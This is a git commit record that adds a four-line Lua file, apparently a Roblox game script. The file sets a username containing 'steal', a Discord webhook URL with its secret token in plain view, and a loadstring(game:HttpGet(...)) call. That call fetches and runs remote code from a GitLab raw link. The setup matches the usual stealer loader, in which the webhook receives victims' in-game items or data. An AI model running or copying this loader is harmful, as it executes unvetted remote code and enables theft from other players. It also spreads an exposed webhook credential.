7eb002f3e2ce605070cc7436dda4355830d35157
hexsildhub <hkhoale6@gmail.com>
2025-06-04 12:22:46 +0700

    Add files via upload

---
+++ v2.lua
@@ -0,0 +1,4 @@
+Username = "stealgrowahk99"
+Webhook = "https://discord.com/api/webhooks/1377238943287738448/HZ9nJDsudpOK0P38NFyjyVLO9D5xKYSiHbIzOBkBT8F4r8umV24ZzaEY--AW2R8KIw98"
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
